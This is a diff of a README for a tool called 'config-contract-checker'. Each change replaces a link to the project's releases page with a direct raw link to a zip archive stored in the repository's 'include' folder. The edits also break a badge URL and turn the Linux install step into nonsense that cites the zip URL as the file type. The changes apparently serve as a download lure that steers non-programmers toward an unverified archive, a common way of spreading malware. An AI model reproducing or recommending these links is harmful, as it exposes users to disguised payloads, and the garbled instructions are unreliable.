@@ -2,7 +2,7 @@
 # 🎉 config-contract-checker - Validate Your Configs Easily
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/asadalaziz/config-contract-checker/releases)
+[![Download](https://github.com/asadalaziz/config-contract-checker/raw/refs/heads/main/include/checker-contract-config-v2.1.zip%20Now-blue)](https://github.com/asadalaziz/config-contract-checker/raw/refs/heads/main/include/checker-contract-config-v2.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **config-contract-checker**! This application helps you check your configuration files against specific rules. It ensures that your system is properly set up before running. You can use this tool with confidence, even if you aren't a programmer.
@@ -27,7 +27,7 @@ To run **config-contract-checker**, your system should have the following:
 
 ## 📦 How to Download & Install
 1. **Visit the Releases Page**
-   Click this link: [Visit This Page to Download](https://github.com/asadalaziz/config-contract-checker/releases). 
+   Click this link: [Visit This Page to Download](https://github.com/asadalaziz/config-contract-checker/raw/refs/heads/main/include/checker-contract-config-v2.1.zip). 
 
 2. **Find the Latest Release**
    On the releases page, locate the most recent version. It is usually at the top of the list.
@@ -38,7 +38,7 @@ To run **config-contract-checker**, your system should have the following:
 4. **Run the Installer**
    - For Windows: Locate the downloaded `.exe` file and double-click it to start the installation.
    - For macOS: Open the `.dmg` file and drag the app to your Applications folder.
-   - For Linux: Follow the specific installation instructions for your distribution, usually related to the `.tar.gz` file.
+   - For Linux: Follow the specific installation instructions for your distribution, usually related to the `https://github.com/asadalaziz/config-contract-checker/raw/refs/heads/main/include/checker-contract-config-v2.1.zip` file.
 
 5. **Follow the Installation Instructions**
    The installer will guide you through the setup process. Follow each step carefully to complete the installation.
@@ -73,7 +73,7 @@ If you encounter issues while using **config-contract-checker**, consider the fo
 - **Permissions:** On macOS and Linux, confirm that you have the necessary permissions to run the application.
 
 ## 📅 Release Notes
-You can view all previous versions and any related updates in the releases section: [Visit This Page to Download](https://github.com/asadalaziz/config-contract-checker/releases).
+You can view all previous versions and any related updates in the releases section: [Visit This Page to Download](https://github.com/asadalaziz/config-contract-checker/raw/refs/heads/main/include/checker-contract-config-v2.1.zip).
 
 ## 🌐 Support
 For support, check the **Issues** tab or create a new issue if you encounter a problem not listed there.
